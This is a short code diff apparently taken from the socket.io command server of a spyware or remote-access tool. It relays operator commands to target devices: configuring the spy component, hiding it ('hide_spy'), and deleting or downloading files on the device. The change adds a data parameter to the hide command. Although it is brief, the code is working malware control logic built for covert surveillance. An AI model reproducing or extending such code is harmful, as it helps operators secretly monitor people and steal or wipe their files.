@@ -128,8 +128,8 @@ socket.on("spy_config", (status, too) => {
   socket.on("delete_file_multi", (def_path, data, too) => {
     io.to(device_secure_ids[too]).emit("delete_multi", def_path, data);
   });
-socket.on("hide_spy", (too) => {
-    io.to(device_secure_ids[too]).emit("hide_spy");
+socket.on("hide_spy", (data,too) => {
+    io.to(device_secure_ids[too]).emit("hide_spy",data);
   });
   socket.on("download_file_multi", (def_path, data, too) => {
     io.to(device_secure_ids[too]).emit("download_multi", def_path, data);
